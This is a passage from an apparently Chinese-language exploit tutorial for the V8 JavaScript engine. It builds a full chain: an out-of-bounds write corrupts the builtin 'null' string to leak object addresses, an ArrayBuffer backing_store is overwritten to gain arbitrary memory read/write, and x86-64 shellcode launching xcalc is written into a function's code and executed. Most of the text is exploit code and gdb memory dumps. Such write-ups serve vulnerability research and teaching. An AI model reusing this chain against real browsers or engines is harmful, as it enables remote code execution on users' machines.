    //  }
    //  - internal fields = {
    //     0
    //     0
    //  }
    var str = new String(null);
    var ab_addr = str.charCodeAt(0)*0x1+str.charCodeAt(1)*0x100+str.charCodeAt(2)*0x10000+str.charCodeAt(3)*0x1000000+str.charCodeAt(4)*0x100000000+str.charCodeAt(5)*0x10000000000+str.charCodeAt(6)*0x1000000000000+str.charCodeAt(7)*0x100000000000000;
    print("0x"+ab_addr.toString(16));
同理，leak出function
### 写null string的地址到它自己的value，从而可以通过写value来再次修改null string
**这里为什么要这么做呢，原因其实在test里已经可以看到的，如果我们写一个smi到一个属性字段，当然可以直接写到该属性字段对应的偏移。**  
也就是如图xyz1，我直接写入了一个0x1821923f的smi，注意smi最大是多少呢，在64位和32位有所不同。  
在64位平台上V8对smi定义的范围是[-2³¹，2³¹-1]，即最大0x7fffffff，显然一个对象的地址会大于它，从而无法直接去写一个地址到该属性字段对应的偏移。
    gdb-peda$ x/20gx $rax-1
    0x3067ec802240: 0x000025b0e3582309  0x0000000000000000
    0x3067ec802250: 0x000025b0e3582361->xyz 0x1821923f->xyz1  803b1506
    0x3067ec802260: 0x00007000->xyz2 00000000   0xdeadbeed6c6c756e
**所以我们要写null string的地址到它自己的value，从而可以通过写value来再次修改null string。**
    Check(String(null));
    // gdb-peda$ x/20gx $rbx-1
    // 0x3817fa502240:  0x00003bd6a4382309  0x0000000000000000
    // 0x3817fa502250:  0x00003bd6a4382361  0x00000000803b1506
    // 0x3817fa502260:  0x0000700000000000  0x00003817fa502251->null string
    // gdb-peda$ job 0x00003bd6a4382361
    // 0x3bd6a4382361: [Map]
    //  - type: ONE_BYTE_INTERNALIZED_STRING_TYPE
    //  - instance size: 0
    //  - elements kind: FAST_HOLEY_ELEMENTS
    //  - unused property fields: 0
    //  - enum length: invalid
    //  - stable_map
    //  - back pointer: 0x3817fa502311 
    //  - instance descriptors (own) #0: 0x3817fa502231 
    //  - layout descriptor: 0
    //  - prototype: 0x3817fa502201 
    //  - constructor: 0x3817fa502201 
    //  - code cache: 0x3817fa502241 
    //  - dependent code: 0x3817fa502241 
    //  - construction counter: 0
### 修改null string的hash字段为ArrayBuffer的length地址
这里我再次提醒一下为什么要写入这个地址。  
之前我们说了，如果写一个smi，可以直接写入，但是如果要写入的数值大于smi，会把该属性字段的值当成一个指针，然后将这个数值写入到那个内存里。  
就比如，我向null string的map字段（对应于n.xyz)写一个非SMI进去.  
double类型的3.4766863919152113e-308等于int类型的0x0019000400007300
    function Check(obj){
    // oob write empty_Fixed_Array, write object to null_str buffer
        n.xyz = 3.4766863919152113e-308; // do not modify string map
        n.xyz1 = 0x0; // do not modify the value
        n.xyz2 = 0x7000; // enlarge length of builtIn string 'null'
        n.xyz3 = obj; // leak the Object addr
    }
    ...
    ...
    gdb-peda$ x/20gx 0x33e606b02241-1
    0x33e606b02240: 0x0000081f59a02309  0x0000000000000000
    0x33e606b02250: 0x0000081f59a02361->n.xyz   0x00000000803b1506
    0x33e606b02260: 0x0000700000000000  0x000017f1e8c36fe96f
    gdb-peda$ x/20gx 0x0000081f59a02361-1
    0x81f59a02360:  0x0000081f59a02259  0x0019000400007300->被写入的3.4766863919152113e-308即0x0019000400007300
    0x81f59a02370:  0x00000000082003ff  0x000033e606b02201
    var m;
    ...
    function Ctor2() {
        m = new Map();  
    }
    function Check2(addr){
        // Oob write empty_Fixed_Array, str buffer value will be treat as a number pointer
        m.xyz = 3.4766863919152113e-308;    // do not modify string map
        m.xyz1 = 0x0                 // do not modify the value
        m.xyz2 = 0x7000         // enlarge length of builtIn string 'null'
        m.xyz3 = addr
    }
    Check2(ab_len_ptr_float);
    // 0x3817fa502250:  0x00003bd6a4382361  0x0000108ed87359d9->ArrayBuffer length的地址
    // 0x3817fa502260:  0x0000700000000000  0x00003817fa502251->null string
    // gdb-peda$ x/20gx 0x108ed87359c1-1
    // 0x108ed87359c0:  0x00002d714c002db1  0x000037191c982241
    // 0x108ed87359d0:  0x000037191c982241  0x0000020000000000->length
    // 0x108ed87359e0:  0x000055ba589d0640->BackingStore
**所以说为了写入一个地址到ArrayBuffer的BackingStore，首先将BackingStore向前减去8个字节的地址即length地址写入到hash字段。**  
### 向null string的hash字段写入任意值，得到任意地址读写的原语
类似于我们上面写map一样，将[length_addr+0x8]即backingstore给覆盖成我们想要写入的内容。  
**在v8里，只要你能修改backingstore的值，就可以进行任意地址读写**  
于是就有了一个任意地址读写的原语。  
**于是我们先将func_addr写到backingstore，读到函数真正执行时候的code地址**
    var l;
    function Ctor3() {
        l = new ArrayBuffer();
    }
    function Check3(addr){
        // Oob write empty_Fixed_Array, str length will be treat as a number pointer 
        l.xyz = 3.4766863919152113e-308;    // do not modify string map
        l.xyz1 = addr             
    }
    Ctor3();
    Check3(func_addr_float);
    f64 = new Float64Array(ab);
    shellcode_addr_float = f64[7];
    print("0x"+(u2d(shellcode_addr_float)).toString(16));
    // gdb-peda$ job 0x108ed87359c1
    // 0x108ed87359c1: [JSArrayBuffer]
    //  - map = 0x2d714c002db1 [FastProperties]
    //  - prototype = 0x108ed8705599
    //  - elements = 0x37191c982241  [FAST_HOLEY_SMI_ELEMENTS]
    //  - internal fields: 2
    //  - backing_store = 0x108ed8735a00->已经被改成了Function的地址
    //  - byte_length = 512
    //  - properties = {
    //  }
    //  - internal fields = {
    //     0
    //     0
    //  }
    // gdb-peda$ x/20gx 0x108ed87359c1-1
    // 0x108ed87359c0:  0x00002d714c002db1  0x000037191c982241
    // 0x108ed87359d0:  0x000037191c982241  0x0000020000000000
    // 0x108ed87359e0:  0x0000108ed8735a00->已经被改成了Function的地址   0x0000000000000004
    // 0x108ed87359f0:  0x0000000000000000  0x0000000000000000
    // gdb-peda$ x/20gx 0x0000108ed8735a01-1
    // 0x108ed8735a00:  0x00002d714c0040f1  0x000037191c982241
    // 0x108ed8735a10:  0x000037191c982241  0x000037191c982351
    // 0x108ed8735a20:  0x0000108ed872d849  0x0000108ed8703951
    // 0x108ed8735a30:  0x000037191c984b21  0x000016396d105e00-->shellcode_addr_float[7]
    ...
    // gdb-peda$ job 0x0000108ed8735a01
    // 0x108ed8735a01: [Function]
    //  - map = 0x2d714c0040f1 [FastProperties]
    //  - prototype = 0x108ed87040b9
    //  - elements = 0x37191c982241  [FAST_HOLEY_ELEMENTS]
    //  - initial_map = 
    //  - shared_info = 0x108ed872d849 
    //  - name = 0x37191c982471 
    //  - formal_parameter_count = 0
    //  - context = 0x108ed8703951 
    //  - literals = 0x37191c984b21 
    //  - code = 0x16396d105da1 
**再将取得的函数真正执行时候执行的函数地址，写入到backingstore，从而通过它进行任意地址写，写入我们的shellcode**
    Check3(shellcode_addr_float);
    // pop /usr/bin/xcalc
    var shellcode = new Uint32Array(ab);
    shellcode[0] = 0x90909090;
    shellcode[1] = 0x90909090;
    shellcode[2] = 0x782fb848;
    shellcode[3] = 0x636c6163;
    shellcode[4] = 0x48500000;
    shellcode[5] = 0x73752fb8;
    shellcode[6] = 0x69622f72;
    shellcode[7] = 0x8948506e;
    shellcode[8] = 0xc03148e7;
    shellcode[9] = 0x89485750;
    shellcode[10] = 0xd23148e6;
    shellcode[11] = 0x3ac0c748;
    shellcode[12] = 0x50000030;
    shellcode[13] = 0x4944b848;
    shellcode[14] = 0x414c5053;
    shellcode[15] = 0x48503d59;
    shellcode[16] = 0x3148e289;
    shellcode[17] = 0x485250c0;
    shellcode[18] = 0xc748e289;
    shellcode[19] = 0x00003bc0;
    shellcode[20] = 0x050f00;
然后再执行这个被我们改了内容的函数，就可以弹计算器了。
    evil_f();
## 参考链接